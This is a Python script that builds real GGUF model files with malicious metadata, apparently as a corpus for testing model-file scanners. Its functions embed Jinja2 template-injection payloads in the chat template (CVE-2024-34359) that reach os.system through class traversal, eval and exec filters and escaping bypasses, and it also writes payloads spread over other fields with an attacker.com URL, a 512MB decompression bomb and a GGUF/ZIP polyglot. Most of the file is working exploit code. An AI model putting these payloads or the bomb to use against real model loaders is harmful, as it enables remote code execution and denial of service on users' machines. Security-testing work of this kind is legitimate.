"""
GGUF Attack Vector Generator

Generates real GGUF binary files (.gguf) with malicious metadata payloads:
- Template injection in tokenizer.chat_template (CVE-2024-34359)
- Metadata field injection
- Compression bomb
- Polyglot files

GGUF v3 binary format is written directly using struct — no external package required.

GGUF v3 wire format (little-endian):
  magic         : 4 bytes  "GGUF"
  version       : uint32
  tensor_count  : uint64
  kv_count      : uint64
  [kv entries]:
    key         : uint64 len + utf-8 bytes
    value_type  : uint32  (8 = STRING)
    value       : uint64 len + utf-8 bytes  (for STRING)
"""

import io
import struct
import zipfile
from pathlib import Path
from typing import Dict, List, Tuple

_GGUF_STRING = 8


def _gguf_str(s: str) -> bytes:
    b = s.encode("utf-8")
    return struct.pack("<Q", len(b)) + b


def _write_gguf(filepath: Path, kv: dict) -> None:
    """Write a real GGUF v3 binary file with the given string KV pairs."""
    body = b""
    for key, val in kv.items():
        body += _gguf_str(key)
        body += struct.pack("<I", _GGUF_STRING)
        body += _gguf_str(str(val))

    header = (
        b"GGUF"
        + struct.pack("<I", 3)          # version
        + struct.pack("<Q", 0)          # tensor_count = 0
        + struct.pack("<Q", len(kv))    # kv_count
    )
    filepath.write_bytes(header + body)


class GGUFAttackGenerator:
    """Generate GGUF-based attack vectors (real .gguf binary files)."""

    def __init__(self, output_dir: str = "./output"):
        self.output_dir = Path(output_dir) / "gguf_vectors"
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.generated_files = []

    def generate_basic_ssti(self) -> Tuple[str, int]:
        """Generate basic Jinja2 SSTI in chat_template.

        Attack Vector: CVE-2024-34359
            {{ 7*7 }} evaluates to 49 inside llama-cpp-python Jinja2 renderer.

        Severity: CRITICAL
        Reference: CVE-2024-34359 (llama-cpp-python)
        """
        filepath = self.output_dir / "01_basic_ssti.gguf"
        _write_gguf(filepath, {
            "general.name": "malicious-model",
            "tokenizer.chat_template": "{{ 7*7 }}",
        })
        self.generated_files.append(str(filepath))
        return str(filepath), 1

    def generate_class_traversal_ssti(self) -> Tuple[str, int]:
        """Generate SSTI with Python class hierarchy traversal.

        Attack Vector:
            {{ config.__class__.__bases__[0].__subclasses__() }}
            Enumerates all loaded Python classes to find os/subprocess.

        Severity: CRITICAL
        """
        filepath = self.output_dir / "02_class_traversal_ssti.gguf"
        _write_gguf(filepath, {
            "general.name": "malicious-model",
            "tokenizer.chat_template":
                "{{ config.__class__.__bases__[0].__subclasses__() }}",
        })
        self.generated_files.append(str(filepath))
        return str(filepath), 1

    def generate_module_access_ssti(self) -> Tuple[str, int]:
        """Generate SSTI with direct os.system call via __globals__.

        Attack Vector:
            Traverses class hierarchy to reach sys.modules['os'].system().

        Severity: CRITICAL
        """
        payload = (
            "{{ config.__class__.__bases__[0].__subclasses__()[104]"
            ".__init__.__globals__['sys'].modules['os'].system('id') }}"
        )
        filepath = self.output_dir / "03_module_access_ssti.gguf"
        _write_gguf(filepath, {
            "general.name": "malicious-model",
            "tokenizer.chat_template": payload,
        })
        self.generated_files.append(str(filepath))
        return str(filepath), 1

    def generate_builtin_filter_ssti(self) -> Tuple[str, int]:
        """Generate SSTI using Jinja2 eval/exec filter chains.

        Attack Vector:
            {{ "__import__('os').system('id')" | eval }}
            Exploits unsafe Jinja2 filter registration.

        Severity: CRITICAL
        """
        filepath = self.output_dir / "04_builtin_filter_ssti.gguf"
        _write_gguf(filepath, {
            "general.name": "malicious-model",
            "tokenizer.chat_template": '{{ "__import__(\'os\').system(\'id\')" | eval }}',
            "tokenizer.alt_template_1": '{{ "import os; os.system(\'whoami\')" | exec }}',
            "tokenizer.alt_template_2": '{{ dict()|attr("__init__")|attr("__globals__")["sys"] }}',
        })
        self.generated_files.append(str(filepath))
        return str(filepath), 3

    def generate_multiline_ssti(self) -> Tuple[str, int]:
        """Generate multi-line SSTI bypassing newline-based filters.

        Attack Vector:
            {%- set os = __import__('os') -%}
            {%- set result = os.system('id') -%}
            Bypasses simple single-line string matching.

        Severity: CRITICAL
        """
        payload = (
            "{%- set os = __import__('os') -%}\n"
            "{%- set result = os.system('id') -%}\n"
            "{{ result }}"
        )
        filepath = self.output_dir / "05_multiline_ssti.gguf"
        _write_gguf(filepath, {
            "general.name": "malicious-model",
            "tokenizer.chat_template": payload,
        })
        self.generated_files.append(str(filepath))
        return str(filepath), 1

    def generate_metadata_injection(self) -> Tuple[str, int]:
        """Generate injection across multiple metadata fields.

        Attack Vector:
            Payloads spread across general.description, general.url,
            and custom fields — tests scanners that only check chat_template.

        Severity: HIGH
        """
        kv = {
            "general.name": "malicious-model",
            "general.description": "__import__('os').system('id')",
            "general.url": "http://attacker.com/download",
            "tokenizer.ggml_vocab_type": "{{ 7*7 }}",
            "custom.payload": (
                "{{ config.__class__.__bases__[0].__subclasses__()[104]"
                ".__init__.__globals__['os'].system('whoami') }}"
            ),
        }
        filepath = self.output_dir / "06_metadata_injection.gguf"
        _write_gguf(filepath, kv)
        self.generated_files.append(str(filepath))
        injection_count = sum(
            1 for v in kv.values() if "__import__" in v or "{{" in v
        )
        return str(filepath), injection_count

    def generate_compression_bomb(self) -> Tuple[str, int]:
        """Generate GGUF with a ZIP-compressed decompression bomb appended.

        Attack Vector:
            Valid GGUF header + appended ZIP containing 512MB of zeros
            compressed to ~512KB. Parsers that unwrap attachments OOM.

        Severity: MEDIUM (DoS)
        """
        filepath = self.output_dir / "07_compression_bomb.gguf"

        kv = {
            "general.name": "bomb-model",
            "tokenizer.chat_template": "{{ 7*7 }}",
        }
        gguf_bytes = (
            b"GGUF"
            + struct.pack("<I", 3)
            + struct.pack("<Q", 0)
            + struct.pack("<Q", len(kv))
        )
        for key, val in kv.items():
            gguf_bytes += _gguf_str(key)
            gguf_bytes += struct.pack("<I", _GGUF_STRING)
            gguf_bytes += _gguf_str(val)

        zip_buf = io.BytesIO()
        with zipfile.ZipFile(zip_buf, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("data.bin", b"A" * (512 * 1024 * 1024))
        filepath.write_bytes(gguf_bytes + zip_buf.getvalue())

        self.generated_files.append(str(filepath))
        return str(filepath), 100

    def generate_polyglot_gguf(self) -> Tuple[str, int]:
        """Generate polyglot: valid GGUF header + appended ZIP archive.

        Attack Vector:
            Both `gguf` and `zipfile` parsers can open the same file.
            Bypasses format-gating security checks.

        Severity: MEDIUM
        """
        filepath = self.output_dir / "08_polyglot_gguf.gguf"

        kv = {
            "general.name": "polyglot-model",
            "tokenizer.chat_template": "{{ payload }}",
        }
        gguf_bytes = (
            b"GGUF"
            + struct.pack("<I", 3)
            + struct.pack("<Q", 0)
            + struct.pack("<Q", len(kv))
        )
        for key, val in kv.items():
            gguf_bytes += _gguf_str(key)
            gguf_bytes += struct.pack("<I", _GGUF_STRING)
            gguf_bytes += _gguf_str(val)

        zip_buf = io.BytesIO()
        with zipfile.ZipFile(zip_buf, "w", zipfile.ZIP_STORED) as zf:
            zf.writestr("hidden_payload.txt", "malicious content here")
        filepath.write_bytes(gguf_bytes + zip_buf.getvalue())

        self.generated_files.append(str(filepath))
        return str(filepath), 2

    def generate_escaped_template(self) -> Tuple[str, int]:
        """Generate SSTI using hex-escape and cycler bypass techniques.

        Attack Vector:
            {{ ''['\\x5f\\x5fclass\\x5f\\x5f'] }} — encodes '__class__'
            {{ cycler.__init__.__globals__.os.system('id') }} — via cycler

        Severity: CRITICAL
        """
        filepath = self.output_dir / "09_escaped_template.gguf"
        _write_gguf(filepath, {
            "general.name": "malicious-model",
            "tokenizer.chat_template": "{{ ''['\\x5f\\x5fclass\\x5f\\x5f'] }}",
            "tokenizer.alt_template_1": "{{ cycler.__init__.__globals__.os.system('id') }}",
            "tokenizer.alt_template_2": "{{ request.environ['LD_PRELOAD'] }}",
        })
        self.generated_files.append(str(filepath))
        return str(filepath), 4

    def generate_all(self) -> Dict[str, Tuple[str, int]]:
        """Generate all GGUF attack vectors."""
        return {
            "basic_ssti": self.generate_basic_ssti(),
            "class_traversal": self.generate_class_traversal_ssti(),
            "module_access": self.generate_module_access_ssti(),
            "builtin_filters": self.generate_builtin_filter_ssti(),
            "multiline_ssti": self.generate_multiline_ssti(),
            "metadata_injection": self.generate_metadata_injection(),
            "compression_bomb": self.generate_compression_bomb(),
            "polyglot_gguf": self.generate_polyglot_gguf(),
            "escaped_template": self.generate_escaped_template(),
        }

    def get_generated_files(self) -> List[str]:
        return self.generated_files


if __name__ == "__main__":
    generator = GGUFAttackGenerator(output_dir="./output")
    results = generator.generate_all()
    for name, (path, metric) in results.items():
        print(f"{name}: {path} ({metric})")
